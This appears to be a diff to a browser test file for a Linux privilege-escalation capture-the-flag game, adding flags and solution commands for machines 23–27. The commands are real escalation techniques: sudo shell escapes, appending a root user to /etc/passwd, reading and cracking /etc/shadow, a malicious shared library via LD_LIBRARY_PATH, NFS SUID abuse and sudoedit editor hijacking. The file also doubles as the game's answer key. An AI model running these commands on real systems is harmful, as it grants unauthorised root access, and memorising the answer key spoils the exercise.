@@ -24,7 +24,24 @@ const SOLUTIONS = {
     19: { flag: 'flag{l3ss_is_r00t}', cmds: ['sudo less !/bin/sh'] },
     20: { flag: 'flag{te3_p1ped_r00t}', cmds: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'] },
     21: { flag: 'flag{cap_dac_sh4d0w_pwn}', cmds: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'] },
-    22: { flag: 'flag{ld_l1brary_p4th_pwn}', final: true, cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'] },
+    22: { flag: 'flag{ld_l1brary_p4th_pwn}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'] },
+    23: { flag: 'flag{nfs_n0_root_squash}', cmds: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'] },
+    24: { flag: 'flag{p3rl_ex3c_r00t}', cmds: ["sudo perl -e 'exec \"/bin/sh\";'"] },
+    25: { flag: 'flag{n0de_ch1ld_pr0cess}', cmds: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''] },
+    26: {
+        flag: 'flag{sud0edit_ed1tor_pwn}',
+        cmds: [
+            "echo '#!/bin/sh' > /tmp/pwn.sh",
+            'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
+            'chmod +x /tmp/pwn.sh',
+            'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
+        ]
+    },
+    27: {
+        flag: 'flag{dac_0verride_pwn}',
+        final: true,
+        cmds: ["python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"", 'su pwnd']
+    },
 };
 
 async function enter(page, id) {
@@ -56,7 +73,7 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
 
 test('hub renders 22 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(23);
+    await expect(page.locator('.machine-card')).toHaveCount(27);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
     await expect(page.locator('#homeProgressText')).toHaveText('0 / 22');
 });
